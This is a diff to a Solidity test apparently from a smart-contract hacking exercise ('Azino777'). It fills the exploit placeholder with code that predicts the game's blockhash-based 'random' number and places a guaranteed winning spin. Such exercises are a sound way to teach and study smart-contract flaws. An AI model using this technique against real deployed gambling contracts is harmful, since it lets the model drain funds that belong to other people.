@@ -16,7 +16,11 @@ contract Azino777Test is BaseTest {
 
     function testExploitLevel() public {
         /* YOUR EXPLOIT GOES HERE */
-
+	vm.roll(43134);
+    	uint256 factor = (1157920892373161954235709850086879078532699846656405640394575840079131296399 * 100) / 100;
+    	uint256 hashVal = uint256(blockhash(block.number - 1));
+    	uint256 bet = (hashVal / factor) % 100;
+    	instance.spin{value: 0.01 ether}(bet);
         checkSuccess();
     }
 
